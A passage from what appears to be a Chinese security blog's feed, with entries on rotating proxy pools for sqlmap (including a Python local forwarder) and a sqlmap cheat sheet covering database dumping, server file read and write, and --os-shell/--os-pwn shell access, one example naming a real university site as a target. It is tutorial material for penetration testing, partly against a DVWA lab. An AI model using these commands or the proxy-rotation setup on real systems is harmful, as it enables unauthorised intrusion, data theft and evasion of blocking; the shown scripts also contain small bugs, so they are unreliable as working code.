查看。</p><table><thead><tr><th>api</th><th>method</th><th>Description</th><th>arg</th></tr></thead><tbody><tr><td>/</td><td>GET</td><td>api介绍</td><td>None</td></tr><tr><td>/get</td><td>GET</td><td>随机获取一个代理</td><td>None</td></tr><tr><td>/get_all</td><td>GET</td><td>获取所有代理</td><td>None</td></tr><tr><td>/get_status</td><td>GET</td><td>查看代理数量</td><td>None</td></tr><tr><td>/delete</td><td>GET</td><td>删除代理</td><td>proxy=host:ip</td></tr></tbody></table><h3 id="保存代理">保存代理</h3><p>自己编写了个小脚本将<code>ProxyPool.py</code>获取到的代理保存在<code>ips.txt</code>中<br><strong>get_proxy.py</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_proxy():</span><br><span class="line">    return requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_all&#x2F;&quot;).json()</span><br><span class="line"></span><br><span class="line">def delete_proxy(proxy):</span><br><span class="line">    requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;delete&#x2F;?proxy&#x3D;&#123;&#125;&quot;.format(proxy))</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_status&quot;).json()</span><br><span class="line">count &#x3D; res.get(&quot;useful_proxy&quot;)</span><br><span class="line">print(&quot;目前代理池中共计：%s个代理.&quot; % count)</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;ips.txt&quot;, &quot;w&quot;)</span><br><span class="line">for i in range(count):</span><br><span class="line">    b &#x3D; get_proxy()[i][&quot;proxy&quot;]</span><br><span class="line">f.write(b + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h2 id="本地代理转发">本地代理转发</h2><p>借用前人的成果，实现的效果是启用本地<code>127.0.0.1:9999</code>服务，将<code>ips.txt</code>内的代理转发给本地客户端<br><strong><a href="http://ips.py">ips.py</a></strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> error</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">localtime = time.asctime(time.localtime(time.time()))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyServerTest</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, proxyip</span>):</span></span><br><span class="line">        <span class="comment"># 本地socket服务</span></span><br><span class="line">        self.ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.proxyip = proxyip</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 本地服务IP和端口</span></span><br><span class="line">            self.ser.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>))</span><br><span class="line">            <span class="comment"># 最大连接数</span></span><br><span class="line">            self.ser.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">&quot;[-]The local service : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[-]The local service : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 接收客户端数据</span></span><br><span class="line">                client, addr = self.ser.accept()</span><br><span class="line">                print(<span class="string">&#x27;[*]accept %s connect&#x27;</span> % (addr,))</span><br><span class="line">                data = client.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                print(<span class="string">&#x27;[*&#x27;</span> + localtime + <span class="string">&#x27;]: Accept data...&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;[-]Local receiving client : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[-]Local receiving client : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 目标代理服务器，将客户端接收数据转发给代理服务器</span></span><br><span class="line">                mbsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                iplen = <span class="built_in">len</span>(self.proxyip)</span><br><span class="line">                proxyip = self.proxyip[random.randint(<span class="number">0</span>, iplen - <span class="number">1</span>)]</span><br><span class="line">                print(<span class="string">&quot;[!]Now proxy ip:&quot;</span> + <span class="built_in">str</span>(proxyip))</span><br><span class="line">                prip = proxyip[<span class="number">0</span>]</span><br><span class="line">                prpo = proxyip[<span class="number">1</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    mbsocket.settimeout(<span class="number">3</span>)</span><br><span class="line">                    mbsocket.connect((prip, prpo))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">&quot;[-]RE_Connect...&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#                   except :</span></span><br><span class="line">            <span class="comment">#                       print(&quot;[-]Connect failed,change proxy ip now...&quot;)</span></span><br><span class="line">            <span class="comment">#                      pass</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                mbsocket.send(data)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;[-]Sent to the proxy server : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[-]Sent to the proxy server : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line">                               </span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># 从代理服务器接收数据，然后转发回客户端</span></span><br><span class="line">                    data_1 = mbsocket.recv(<span class="number">1024</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> data_1:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    print(<span class="string">&#x27;[*&#x27;</span> + localtime + <span class="string">&#x27;]: Send data...&#x27;</span>)</span><br><span class="line">                    client.send(data_1)</span><br><span class="line">                <span class="keyword">except</span> socket.timeout <span class="keyword">as</span> e:</span><br><span class="line">                    print(proxyip)</span><br><span class="line">                    print(<span class="string">&quot;[-]Back to the client : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 关闭连接</span></span><br><span class="line"></span><br><span class="line">            client.close()</span><br><span class="line">            mbsocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Loadips</span>():</span></span><br><span class="line">    print(<span class="string">&quot;[*]Loading proxy ips..&quot;</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    ip = [<span class="string">&#x27;ip&#x27;</span>, <span class="string">&#x27;port&#x27;</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ips.txt&quot;</span>) <span class="keyword">as</span> ips:</span><br><span class="line">        lines = ips.readlines()</span><br><span class="line">                               </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        ip[<span class="number">0</span>], ip[<span class="number">1</span>] = line.strip().split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        ip[<span class="number">1</span>] = <span class="built_in">eval</span>(ip[<span class="number">1</span>])</span><br><span class="line">        nip = <span class="built_in">tuple</span>(ip)</span><br><span class="line">        ip_list.append(nip)</span><br><span class="line">    <span class="keyword">return</span> ip_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;&#x27;&#x27;*Atuhor : V@1n3R.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Blog :http://www.Lz1y.cn</span></span><br><span class="line"><span class="string">*date: 2017.7.17</span></span><br><span class="line"><span class="string">*http://www.Lz1y.cn/wordpress/?p=643</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         __     __    _       _____ ____    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         \ \   / /_ _/ |_ __ |___ /|  _ \   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          \ \ / / _` | | &#x27;_ \  |_ \| |_) |  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                           \ V / (_| | | | | |___) |  _ &lt; _ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            \_/ \__,_|_|_| |_|____/|_| \_(_) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ip_list = Loadips()</span><br><span class="line">    <span class="comment">#   ip_list = [(&#x27;118.89.148.92&#x27;,8088)]</span></span><br><span class="line">    <span class="comment">#   ip_list = tuple(ip_list)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pst = ProxyServerTest(ip_list)</span><br><span class="line">        <span class="comment"># 多线程</span></span><br><span class="line">        t = threading.Thread(target=pst.run, name=<span class="string">&#x27;LoopThread&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;[*]Waiting for connection...&#x27;</span>)</span><br><span class="line">        <span class="comment"># 关闭多线程</span></span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[-]main : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[-]main : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="SqlMap使用代理池">SqlMap使用代理池</h2><blockquote><p>sqlmap加上代理 “–proxy=http://127.0.0.1:9999” 即可使用</p><p>使用之前建议先检测一下代理的有效性：<a href="http://h.jiguangdaili.com/check/">http://h.jiguangdaili.com/check/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;获取代理池&quot;&gt;获取代理池&lt;/h2&gt;
&lt;p&gt;获取代理池使用了GIthub上的项目：&lt;a href=&quot;https://github.com/jhao104/proxy_pool&quot;&gt;https://github.com/jhao104/proxy_pool&lt;/a&gt; ，并
      
    
    </summary>
    
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Sqlmap" scheme="http://yoursite.com/tags/Sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>SqlMap总结</title>
    <link href="http://yoursite.com/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/</id>
    <published>2020-06-22T03:29:58.000Z</published>
    <updated>2020-06-22T03:29:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SqlMap测试基本流程">SqlMap测试基本流程</h2><blockquote><p>sqlmap -u “url”<br>sqlmap -u URL –dbs<br>sqlmap -u URL -D database –tables<br>sqlmap -u URL -D database -T tablename –columns<br>sqlmap -u URL -D database -T tablename -C columnsname –dump</p></blockquote><h2 id="SqlMap常用命令">SqlMap常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">-–batch 默认选项运行</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">–dbms 指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例</span><br><span class="line">--proxy http:&#x2F;&#x2F;local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads&#x3D;                       使用多少线程</span><br><span class="line">–fresh-queries fresh-queries会忽略之前的查询结果,进行重新请求操作</span><br><span class="line">–flush-session flush-session会清空当前URL相关的session</span><br><span class="line">–level 设置检测的方方面面和测试用例</span><br><span class="line">    - 默认是1,会尝试POST和GET</span><br><span class="line">    - 2:Cookie也会加入检测</span><br><span class="line">    - 3:User-Agent和Referer也会检测, 更大的值会增加用例量</span><br><span class="line">-–technique 指定sqlmap使用的检测技术</span><br><span class="line">    B:Boolean-based-blind （布尔型注入）</span><br><span class="line">    U:Union query-based （联合注入）</span><br><span class="line">    E:Error-based （报错型注入)</span><br><span class="line">    S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</span><br><span class="line">    T:Time-based blind （基于时间延迟注入）</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="MYSQL新特性secure-file-priv对读写文件的影响">MYSQL新特性secure_file_priv对读写文件的影响</h2><p>secure-file-priv是在Mysql5.7版本后引入的新特性，secure-file-priv参数是用来限制导入导出传到哪个指定目录</p><ul><li>当配置文件内没有secure-file-priv参数，表示限制mysqld 不允许导入|导出</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li></ul><p>解决方法：<br>windows下：修改my.ini 在[mysqld]内加入secure_file_priv =<br>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =<br>之后需重启Mysql</p><h2 id="SqlMap技巧">SqlMap技巧</h2><h3 id="抓包注入">抓包注入</h3><p>从bp抓包文件中检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot;</span><br></pre></td></tr></table></figure><h3 id="指定检测参数">指定检测参数</h3><ul><li>-p 参数名</li><li>参数后面加上<code>*</code>d</li></ul><h3 id="伪静态注入">伪静态注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;sfl.fzu.edu.cn&#x2F;index.php&#x2F;Index&#x2F;view&#x2F;id&#x2F;40*.html&quot;</span><br></pre></td></tr></table></figure><h3 id="需要登陆的注入">需要登陆的注入</h3><p>利用cookie参数注入，也可以使用抓包注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp; Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot;</span><br></pre></td></tr></table></figure><h3 id="交互式shell">交互式shell</h3><p>写文件的两个前提：</p><ol><li>获取网站的绝对路径</li><li>拥有足够的权限<code>dba/root</code></li></ol><p>首先判断当前是否为dba权限</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133450.png" alt=""></p><p>开始写入shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot; --os-shell</span><br></pre></td></tr></table></figure><p>选择shell脚本类型，接着输入路径，写入成功就进入一个交互式的shell命令行，还会返回一个上传文件的路径，也就是写入了2个shell，一个用来执行命令，另一个用来上传，其中上传shell的文件名为tmpugppx.php，出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133910.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622134053.png" alt=""></p><h3 id="文件读写">文件读写</h3><p>读文件需要知道路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-read&#x3D;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;php.ini</span><br></pre></td></tr></table></figure><p>写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-write C:\1.txt --file-dest &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;vulnerabilities&#x2F;exec&#x2F;1.txt</span><br></pre></td></tr></table></figure><p>表示将本地<code>C:\\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p><h3 id="辅助手工注入">辅助手工注入</h3><p>两种方式，一种是每执行一次都会使用手工的语句注入一遍，效率比较低，第二种类似于平常命令行执行sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot; --sql-query &quot;sql语句&quot;</span><br><span class="line">sqlmap.py -r &quot;路径&quot; --sql-shell</span><br></pre></td></tr></table></figure><h2 id="SqlMap检测参数">SqlMap检测参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">--current-user      检索当前用户</span><br><span class="line">--current-db        检索当前数据库</span><br><span class="line">-is-dba 当前用户权限（是否为root权限）</span><br><span class="line">-dbs 所有数据库</span><br><span class="line">--users             列出用户列表</span><br><span class="line">--passwords         列出用户密码的hash值</span><br><span class="line">--os-shell          提示为交互式操作系统shell</span><br><span class="line">--os-pwn            提示为OOB外壳，Meterpreter或VNC</span><br><span class="line">--batch             永远不要要求用户输入，使用默认行为</span><br><span class="line">--sql-shell         提示输入交互式sqlmap shell</span><br><span class="line">请求:</span><br><span class="line">    这些选项可用于指定如何连接到目标URL</span><br><span class="line">    --data&#x3D;DATA         数据字符串通过POST发送</span><br><span class="line">    --cookie&#x3D;COOKIE     HTTP Cookie的值</span><br><span class="line">    --random-agent      随机选择 HTTP User-Agent 头的值</span><br><span class="line">    --proxy&#x3D;PROXY       使用代理去连接目标URL</span><br><span class="line">    --tor               使用匿名网络</span><br><span class="line">    --check-tor         检查Tor是否正确使用</span><br><span class="line"></span><br><span class="line">File system access（访问文件系统）：</span><br><span class="line">这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"></span><br><span class="line">    –file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line">    –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">    –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">Optimization（优化）：</span><br><span class="line">这些选项可用于优化SqlMap的性能。</span><br><span class="line">    -o 开启所有优化开关</span><br><span class="line">    –predict-output 预测常见的查询输出</span><br><span class="line">    –keep-alive 使用持久的HTTP（S）连接</span><br><span class="line">    –null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line">    –threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"></span><br><span class="line">Injection（注入）：</span><br><span class="line">这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line">    -p TESTPARAMETER 可测试的参数（S）</span><br><span class="line">    –dbms&#x3D;DBMS 强制后端的DBMS为此值</span><br><span class="line">    –os&#x3D;OS 强制后端的DBMS操作系统为这个值</span><br><span class="line">    –prefix&#x3D;PREFIX 注入payload字符串前缀</span><br><span class="line">    –suffix&#x3D;SUFFIX 注入payload字符串后缀</span><br><span class="line">    –tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</span><br><span class="line"></span><br><span class="line">Detection（检测）：</span><br><span class="line">这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line">    –level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</span><br><span class="line">    –risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</span><br><span class="line">    –string&#x3D;STRING 查询时有效时在页面匹配字符串</span><br><span class="line">    –regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</span><br><span class="line">    –text-only 仅基于在文本内容比较网页</span><br><span class="line"></span><br><span class="line">Techniques（技巧）：</span><br><span class="line">这些选项可用于调整具体的SQL注入测试。</span><br><span class="line">    –technique&#x3D;TECH SQL注入技术测试（默认BEUST）</span><br><span class="line">    –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line">    –union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</span><br><span class="line">    –union-char&#x3D;UCHAR 用于暴力猜解列数的字符</span><br><span class="line"></span><br><span class="line">Fingerprint（指纹）：</span><br><span class="line">    -f, –fingerprint 执行检查广泛的DBMS版本指纹</span><br><span class="line"></span><br><span class="line">Brute force（蛮力）：</span><br><span class="line">这些选项可以被用来运行蛮力检查。</span><br><span class="line">    –common-tables 检查存在共同表</span><br><span class="line">    –common-columns 检查存在共同列</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SqlMap测试基本流程&quot;&gt;SqlMap测试基本流程&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;sqlmap -u “url”&lt;br&gt;
sqlmap -u URL –dbs&lt;br&gt;
sqlmap -u URL -D database –tables&lt;br&gt;
sql
      
    
    </summary>
    
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Sqlmap" scheme="http://yoursite.com/tags/Sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite——Intruder四种模式详解</title>
    <link href="http://yoursite.com/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-06-17T14:57:52.000Z</published>
    <updated>2020-06-17T14:57:52.000Z</updated>
    
